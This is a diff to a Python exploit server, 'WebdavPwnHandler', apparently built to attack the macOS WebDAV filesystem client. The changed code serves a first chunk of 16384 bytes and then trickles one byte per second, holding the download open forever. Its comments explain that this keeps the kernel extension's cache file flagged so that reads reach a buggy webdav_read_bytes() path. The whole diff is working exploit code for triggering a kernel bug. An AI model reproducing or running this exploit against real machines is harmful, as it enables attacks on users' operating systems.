@@ -181,21 +181,28 @@ class WebdavPwnHandler(BaseHTTPRequestHandler):
             if send:
                 self.wfile.write(BODY_BYTE * send)
         else:
-            # Plain GET = the mount daemon's background download of the
-            # whole file.  NEVER let it finish: keep the connection open
-            # and trickle 1 byte/sec so the kext keeps UF_NODUMP set on the
-            # cache file.  Only then does pread() past the downloaded end
-            # take the buggy webdav_read_bytes() path (which issues its own
-            # Range GET on a second connection -- handled above).
-            LOG.info("GET %s (no Range) -> 200 trickle, download held open",
-                     self.path)
+            # Plain GET = the mount daemon's streamed GET in network_open()
+            # / background download.  stream_get_transaction() synchronously
+            # reads first_read_len body bytes BEFORE replying to the kernel's
+            # OPEN upcall, so send those immediately or open() hangs.
+            # first_read_len is the system page size (get_first_read_len):
+            # 16384 on arm64, 4096 on x86_64 -- send 16384 to cover both.
+            # After that, trickle 1 byte/sec forever so the download never
+            # finishes: the kext keeps UF_NODUMP set on the cache file and
+            # pread() past the downloaded end takes the buggy
+            # webdav_read_bytes() path (its Range GET arrives on a second
+            # connection and is handled above).
+            LOG.info("GET %s (no Range) -> 200 first-read + trickle, "
+                     "download held open", self.path)
             self.send_response(200)
             self.send_header("Content-Length", str(FILE_SIZE))
             self.send_header("Accept-Ranges", "bytes")
             self.send_header("Content-Type", "application/octet-stream")
             self.end_headers()
-            sent = 0
             try:
+                self.wfile.write(BODY_BYTE * 16384)
+                self.wfile.flush()
+                sent = 16384
                 while True:
                     self.wfile.write(BODY_BYTE)
                     self.wfile.flush()
